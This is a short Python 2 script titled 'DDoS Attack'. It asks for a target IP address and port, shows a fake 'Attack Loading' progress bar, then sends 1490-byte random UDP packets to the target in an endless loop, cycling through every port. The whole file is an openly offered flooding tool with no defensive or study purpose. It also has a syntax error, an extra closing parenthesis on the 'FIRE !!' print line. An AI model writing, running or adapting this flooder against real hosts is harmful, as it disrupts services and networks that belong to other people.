import sys
import os
import time
import socket
import random
import math

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("cls")

print 'DDoS Attack'
print "Author : AlexandreZT"
print "GitHub : https://github.com/AlexandreZT"

ip = raw_input("IP Target : ")
port = input("Port       : ")

# loadind ~10s
for i in range (1, 101, 1):
  os.system("cls")
  print 'Attack Loading'
  print "["+"="*int(math.ceil(i/5))+"]", "{0}%".format(i,)
  time.sleep(0.1)

os.system("cls")
print ('FIRE !!'))
time.sleep(2)

sent = 0

while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1